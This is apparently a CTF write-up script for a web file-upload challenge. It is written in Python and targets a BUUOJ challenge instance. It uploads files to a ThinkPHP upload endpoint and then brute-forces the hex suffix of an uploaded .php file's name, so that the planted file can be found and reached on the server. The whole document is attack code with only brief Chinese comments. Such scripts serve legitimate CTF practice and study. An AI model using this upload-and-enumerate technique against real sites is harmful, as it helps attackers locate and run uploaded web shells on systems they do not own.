# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/文件上传/README.md
# TITLE: 文件上传
# CATEGORY: web

import time
import requests

# 获取正常上传后文件路径名
url = "http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/index.php/home/index/upload"
file1 = {'file': open('D:\\1.txt', 'r')}
file2 = {'file[]': open('D:\\1.txt', 'r')}
file3 = {'file': open('D:\\1.txt', 'r')}
# r = requests.post(url, files=file1)
# print(r.text)
# r = requests.post(url, files=file2)
# print(r.text)
# r = requests.post(url, files=file3)
# print(r.text)

# 爆破
dir = 'abcdef0123456789'
for i in dir:
    for j in dir:
        for x in dir:
            for y in dir:
                for z in dir:
                    url = 'http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/Public/Uploads/2021-03-03/61eeaef{}{}{}{}{}.php'.format(
                        i, j, x, y, z)
                    r = requests.get(url)
                    # print(url)
                    time.sleep(2)
                    if r.status_code == 200:
                        print(url)
                        break
